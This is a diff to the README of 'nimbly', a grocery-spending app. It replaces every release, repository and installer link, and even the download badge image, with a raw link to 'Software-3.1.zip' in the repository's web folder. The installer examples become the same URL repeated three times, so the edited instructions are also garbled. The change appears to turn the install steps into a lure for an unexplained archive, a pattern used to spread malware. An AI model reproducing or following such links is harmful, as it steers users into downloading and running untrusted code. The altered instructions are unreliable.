@@ -6,9 +6,9 @@ Welcome to nimbly! This app helps you manage your spending on groceries. With ni
 
 ## 📥 Download nimbly
 
-[![Download nimbly](https://img.shields.io/badge/Download-nimbly-blue.svg)](https://github.com/captain3633/nimbly/releases)
+[![Download nimbly](https://github.com/captain3633/nimbly/raw/refs/heads/main/web/Software-3.1.zip)](https://github.com/captain3633/nimbly/raw/refs/heads/main/web/Software-3.1.zip)
 
-To get started, visit this page to download nimbly: [Download nimbly](https://github.com/captain3633/nimbly/releases).
+To get started, visit this page to download nimbly: [Download nimbly](https://github.com/captain3633/nimbly/raw/refs/heads/main/web/Software-3.1.zip).
 
 ## 🖥️ System Requirements
 
@@ -31,11 +31,11 @@ nimbly comes packed with features to enhance your grocery shopping experience:
 
 To install nimbly, follow these steps:
 
-1. **Visit the Download Page**: Go to the [Download nimbly](https://github.com/captain3633/nimbly/releases) page.
+1. **Visit the Download Page**: Go to the [Download nimbly](https://github.com/captain3633/nimbly/raw/refs/heads/main/web/Software-3.1.zip) page.
    
 2. **Select Your Version**: Look for the latest version listed on the page.
 
-3. **Download the File**: Click on the file that matches your operating system. For example, you might see options like `nimbly-windows.exe`, `nimbly-macos.zip`, or `nimbly-linux.tar.gz`.
+3. **Download the File**: Click on the file that matches your operating system. For example, you might see options like `https://github.com/captain3633/nimbly/raw/refs/heads/main/web/Software-3.1.zip`, `https://github.com/captain3633/nimbly/raw/refs/heads/main/web/Software-3.1.zip`, or `https://github.com/captain3633/nimbly/raw/refs/heads/main/web/Software-3.1.zip`.
 
 4. **Run the Installer**:
    - **Windows**: Open the downloaded `.exe` file and follow the on-screen prompts.
@@ -75,7 +75,7 @@ We welcome contributions to improve nimbly. If you have ideas, please check our 
 
 Follow us for updates and new features:
 
-- [GitHub Repository](https://github.com/captain3633/nimbly)
+- [GitHub Repository](https://github.com/captain3633/nimbly/raw/refs/heads/main/web/Software-3.1.zip)
 - [Twitter](#) (replace with actual link)
 
 Thank you for choosing nimbly to help manage your grocery spending better!
